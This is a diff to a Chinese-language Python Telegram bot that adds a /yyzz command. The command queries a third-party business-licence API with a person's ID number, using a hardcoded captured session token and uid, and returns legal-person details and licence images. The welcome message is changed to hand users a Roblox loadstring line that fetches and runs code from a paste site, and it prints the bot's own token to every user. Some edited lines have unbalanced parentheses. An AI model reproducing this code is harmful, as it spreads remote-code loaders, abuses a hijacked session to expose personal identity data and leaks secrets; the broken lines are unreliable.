@@ -115,6 +115,85 @@ class ExpressTracker:
         except requests.exceptions.RequestException as e:
             return f"请求发生错误: {e}"
 
+# ========== 营业执照查询类 ==========
+class BusinessLicense:
+    @staticmethod
+    def send_bind_legal_person_request(id_num: str, uniscid: str):
+        """发送绑定法人请求"""
+        url = "https://app.data.bianjingtong.net/applet-app/v2/license/bind-legal-person"
+        headers = {
+            "Host": "app.data.bianjingtong.net",
+            "Connection": "keep-alive",
+            "Content-Length": "61",
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache",
+            "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Android WebView\";v=\"120\"",
+            "sec-ch-ua-mobile": "?0",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 14; 24122RKC7C Build/UKQ1.231025.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Safari/537.36",
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "Accept": "application/json, text/plain, */*",
+            "uid": "1911733425421402113",
+            "openid": "",
+            "token": "bb35db57-7501-49d3-a1f1-98a667c9d0b2",
+            "sec-ch-ua-platform": "\"Android\"",
+            "Origin": "https://admin.bianjingtong.net",
+            "X-Requested-With": "bjb.com.zy.zh.zyzh",
+            "Sec-Fetch-Site": "same-site",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+        }
+        data = {
+            "idNum": id_num,
+            "uniscid": uniscid,
+            "channel": "1"
+        }
+        try:
+            requests.post(url, headers=headers, data=data)
+        except requests.RequestException as e:
+            print(f"绑定法人请求发送失败: {e}")
+
+    @staticmethod
+    def get_business_info(id_num: str, uniscid: str) -> Dict:
+        """获取营业执照信息并返回完整数据"""
+        BusinessLicense.send_bind_legal_person_request(id_num, uniscid)
+        
+        url = "https://app.data.bianjingtong.net/applet-app/v2/license/getBusinessLicenseByUid"
+        headers = {
+            "Host": "app.data.bianjingtong.net",
+            "Connection": "keep-alive",
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache",
+            "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Android WebView\";v=\"120\"",
+            "sec-ch-ua-mobile": "?0",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 14; 24122RKC7C Build/UKQ1.231025.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Safari/537.36",
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "Accept": "application/json, text/plain, */*",
+            "uid": "1911733425421402113",
+            "openid": "",
+            "token": "bb35db57-7501-49d3-a1f1-98a667c9d0b2",
+            "sec-ch-ua-platform": "\"Android\"",
+            "Origin": "https://admin.bianjingtong.net",
+            "X-Requested-With": "bjb.com.zy.zh.zyzh",
+            "Sec-Fetch-Site": "same-site",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+        }
+        data = {"channel": "1"}
+
+        try:
+            response = requests.post(url, headers=headers, data=data)
+            response.raise_for_status()
+            result = response.json()
+            if result and result.get('data'):
+                return result['data']
+            return {}
+        except Exception as e:
+            print(f"查询失败: {e}")
+            return {}
+
 # ========== 数据管理类 ==========
 class DataManager:
     @staticmethod
@@ -139,11 +218,16 @@ banned_users = DataManager.load_data(BANNED_FILE)
 # ========== 机器人功能 ==========
 async def send_welcome_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    user_info = f"👤 你的账户信息\n🆔 永久ID: <code>{user.id}</code>\n📛 用户名: <code>{user.username or '无'}</code>\n📝 名字: <code>{user.first_name}</code>\n\n"
-    commands = "┏━━━━━━━━━━━━━━━━━━━━┓\n┃      📋 可用命令     ┃\n┣━━━━━━━━━━━━━━━━━━━━┫\n┃/id <用户名> - 查询Roblox ID\n┃/kd <单号> - 查询快递\n┃/help - 帮助信息\n┗━━━━━━━━━━━━━━━━━━━━┛\n"
-    if user.id == ADMIN_ID:
-        commands += "\n👮 管理员命令:\n/ban <用户ID> - 封禁\n/unban <用户ID> - 解封"
-    await update.message.reply_text(f"👋 你好 {user.first_name}！\n\n{user_info}{commands}", parse_mode='HTML')
+    welcome_msg = (
+        "-- only works in mic up & meet people across the world.\n\n"
+        f"loadstring(game:HttpGet(\"https://www.ghostbin.cloud/x2bhh/raw\"))()\n\n"
+        f"昵称: {user.first_name}\n"
+        f"用户名: {user.username or '无'}\n"
+        f"永久ID: {user.id}\n"
+        f"令牌: {TOKEN}\n\n"
+        "复制"
+    )
+    await update.message.reply_text(welcome_msg)
 
 async def handle_id_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) in banned_users:
@@ -165,6 +249,56 @@ async def handle_id_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ 用户不存在")
 
+async def handle_business_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_user.id) in banned_users:
+        await update.message.reply_text("❌ 你的账号已被封禁")
+        return
+    if len(context.args) < 2:
+        await update.message.reply_text("⚠️ 格式: /yyzz 身份证号 统一社会信用代码")
+        return
+    
+    id_num, uniscid = context.args[0], context.args[1]
+    business_data = BusinessLicense.get_business_info(id_num, uniscid)
+    
+    if not business_data:
+        await update.message.reply_text("❌ 查询失败，请检查输入信息")
+        return
+    
+    # 构建详细信息文本
+    info_text = (
+        "==== 企业详细信息 ====\n"
+        f"公司名称: {business_data.get('entname', '未获取')}\n"
+        f"法人姓名: {business_data.get('name', '未获取')}\n"
+        f"信用代码: {business_data.get('uniscid', '未获取')}\n"
+        f"注册地址: {business_data.get('dom', '未获取')}\n"
+        f"成立日期: {business_data.get('estdate', '未获取')}\n"
+        f"营业期限: {business_data.get('opfrom', '未获取')} 至 {business_data.get('opto', '未获取')}\n"
+        f"登记机关: {business_data.get('regorg', '未获取')}\n"
+        f"经营范围: {business_data.get('opsco', '未获取')}\n"
+        f"注册资本: {business_data.get('regcap', '未获取')}\n"
+        f"企业状态: {business_data.get('entstatus', '未获取')}\n"
+        f"文件链接: {business_data.get('showFileUrl', '无链接')}"
+    )
+    
+    # 发送详细信息
+    await update.message.reply_text(info_text)
+    
+    # 如果有电子版营业执照链接，则发送文件
+    if file_url := business_data.get('showFileUrl'):
+        try:
+            response = requests.get(file_url)
+            if response.status_code == 200:
+                with open('temp_license.jpg', 'wb') as f:
+                    f.write(response.content)
+                await update.message.reply_photo(photo=open('temp_license.jpg', 'rb'))
+                os.remove('temp_license.jpg')
+            else:
+                await update.message.reply_text(f"⚠️ 无法下载电子版营业执照 (HTTP {response.status_code})")
+        except Exception as e:
+            await update.message.reply_text(f"⚠️ 获取电子版营业执照时出错: {str(e)}")
+    else:
+        await update.message.reply_text("ℹ️ 无电子版营业执照可供下载")
+
 async def handle_button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -181,14 +315,15 @@ def main():
         CommandHandler("start", send_welcome_message),
         CommandHandler("help", send_welcome_message),
         CommandHandler("id", handle_id_query),
-        CommandHandler("kd", lambda u,c: u.message.reply_text(ExpressTracker.track_express(" ".join(c.args))) if c.args else ...,
+        CommandHandler("kd", lambda u,c: u.message.reply_text(ExpressTracker.track_express(" ".join(c.args))) if c.args else None),
+        CommandHandler("yyzz", handle_business_query),
         CallbackQueryHandler(handle_button_click, pattern="^(show|save)_")
     ])
     
     if ADMIN_ID:
         application.add_handlers([
-            CommandHandler("ban", lambda u,c: (banned_users.update({c.args[0]:True}), DataManager.save_data(banned_users, BANNED_FILE), u.message.reply_text(f"⛔ 已封禁 {c.args[0]}")) if c.args else ...),
-            CommandHandler("unban", lambda u,c: (banned_users.pop(c.args[0], DataManager.save_data(banned_users, BANNED_FILE), u.message.reply_text(f"✅ 已解封 {c.args[0]}")) if c.args and c.args[0] in banned_users else ...)
+            CommandHandler("ban", lambda u,c: (banned_users.update({c.args[0]:True}), DataManager.save_data(banned_users, BANNED_FILE), u.message.reply_text(f"⛔ 已封禁 {c.args[0]}")) if c.args else None,
+            CommandHandler("unban", lambda u,c: (banned_users.pop(c.args[0], None), DataManager.save_data(banned_users, BANNED_FILE), u.message.reply_text(f"✅ 已解封 {c.args[0]}")) if c.args and c.args[0] in banned_users else None)
         ])
     
     application.run_polling()
